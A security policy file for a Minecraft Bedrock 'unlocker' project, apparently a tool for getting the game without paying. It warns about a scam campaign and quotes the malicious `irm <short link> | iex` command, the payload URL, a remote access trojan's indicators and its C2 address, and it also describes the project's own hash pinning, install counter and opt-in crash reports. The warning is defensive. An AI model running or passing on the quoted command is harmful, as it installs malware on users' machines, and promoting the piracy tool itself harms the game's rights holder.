# Security Policy

## Reporting a vulnerability or a scam

- **GitHub issues**: https://github.com/CoelhoFZ/Minecraft-Bedrock-Free/issues
- **Discord**: https://discord.gg/u3S4gFgK6M

Please include: the link/domain, a screenshot, the exact PowerShell command you were shown,
and (if available) the SHA256 of the file. Scam reports are taken as seriously as
vulnerabilities - fake "unlocker fix" links put this project's users at risk.

## Known scam campaign (2026-08-11)

Fake "unlocker fix" installers are being distributed in Discord chats:

- Command shown: `irm https://bit.ly/minecraft-fix-bedrock | iex` (with instructions to run
  "PowerShell as admin")
- The short link redirects to
  `https://pub-6cc50c08966e421a99f142d164ba6140.r2.dev/install.ps1`
  (attacker's Cloudflare R2 bucket) - SHA256
  `42cc1d1c60ad69a65640d1180e44130d375d21f5820fa5539c369f5e8629f544`
- The script installs a remote access trojan: Windows service `SentinelCompanyAgent`,
  components `Sentinel.Agent/Controller/Updater`, `SentinelHost.exe`, `SentinelUpdater.exe`,
  `SentinelNative.exe`, mutex `Global\srvhostInstaller`, Defender exclusions for its temp
  folder, and a C2 endpoint at `http://78.154.103.2:9127` (plain HTTP).
- This repository and its official installer are **not** involved. The attacker mimics the
  `irm | iex` install pattern taught in the README.

**Do not run** `irm <anything> | iex` unless the URL literally starts with
`https://github.com/CoelhoFZ/Minecraft-Bedrock-Free`.

## Official sources

| Channel | URL |
|---|---|
| Repository | https://github.com/CoelhoFZ/Minecraft-Bedrock-Free |
| Releases | https://github.com/CoelhoFZ/Minecraft-Bedrock-Free/releases |
| Discord | https://discord.gg/u3S4gFgK6M |

## Supported versions

- **v4.5.0+** bootstraps (`i.ps1` and `install.bat`) verify the SHA-256 of the downloaded
  `menu.ps1` against a hash pinned in the file itself and abort (fail-closed) when it does not
  match. The hash is computed over the content **normalized to LF** (every byte `0x0D` removed,
  the UTF-8 BOM kept), so it does not depend on CRLF vs LF.
- The binary is pinned too: the menu only accepts the exact SHA-256 of `release/winmm.dll`
  published in `SHA256SUMS.txt` (previous builds are recognized as "already unlocked" so users
  who installed an older build keep working).
- There is **no RSA signature and no `scripts\sign-release.ps1`** in this project (older drafts
  of this document mentioned one - it never shipped). Verification today is the two hash pins
  above plus `SHA256SUMS.txt`.
- Older entry points such as `install.ps1` or `bootstrap-*.ps1` do not exist in this
  repository. The only two supported install methods are
  `irm https://github.com/CoelhoFZ/Minecraft-Bedrock-Free/raw/main/i.ps1 | iex` and the
  `install.bat` published in the Releases page.

## Install counter (anonymous, no personal data)

`mbu-download-counter.xgobg2020.workers.dev` counts **successful unlocker installs**,
not page views or link clicks. The badge shown in the README reads the counter. It
never increments.

- Only `POST /hit` increments. Any other method gets `405`, so crawlers, link
  prefetchers and scanners can no longer inflate the number (until 2026-09-11
  every method incremented).
- One install per source IP per 15 minutes. The dedupe key is a **truncated
  SHA-256 of the IP** (16 hex chars) inside a time bucket, stored with a 15-minute
  expiry - the IP address itself is never written to storage. This exists only so
  installer retries and double-clicks do not count twice.
- No other data is sent: no user id, no hardware id, no paths. The installer's
  request is fire-and-forget, so if it fails nothing breaks and nothing is sent.

## Release integrity maintenance (for maintainers)

1. Make your changes (typically `menu.ps1`).
2. Compute the normalized-LF hash of `menu.ps1`
   (`python3 -c "print(__import__('hashlib').sha256(open('menu.ps1','rb').read().replace(b'\r', b'')).hexdigest())"`)
   and put it in **both** `$menuHash` (`i.ps1`) and `$menuHashPin` (`install.bat`).
3. `install.bat` must stay **pure ASCII**. The cmd.exe batch parser breaks command lines when a
   `.bat` contains non-ASCII bytes (proved on Windows 11 x64: cmd prints "not recognized as an
   internal command" for line fragments, `%errorlevel%` becomes 9009 and the installer never
   runs). Localized messages live in `menu.ps1` (PowerShell reads UTF-8 fine).
4. Do not regenerate `release/winmm.dll`: the published binary is immutable (each build embeds
   random keys). A rebuild means new hashes in `$expectedHash`, `$knownUnlockHashes`,
   `$expectedHashArm64` and `SHA256SUMS.txt`.

## Automatic failure reports (v4.8.0+)

When a failure is detected (installer error, Minecraft not opening after
install, or a crash right after launch), the menu asks the user whether to
send a diagnostic report to the developer (S for yes, N for no). Only after
confirmation the report is posted to a Cloudflare Worker, which forwards it to
a Discord webhook (the webhook URL lives as a Worker secret, never in this
repository).

The report contains technical data about the machine - OS, PowerShell, game
folder paths, Defender exclusions, unlock build and cache status - because it
exists to fix the user's problem. Nothing is sent without the user's explicit
confirmation, and the Worker rate-limits the endpoint. The installer never shows the report on
screen. The Worker itself is **not** part of this repository (it lives in the maintainer's
infrastructure, and the Discord webhook lives there as a secret).
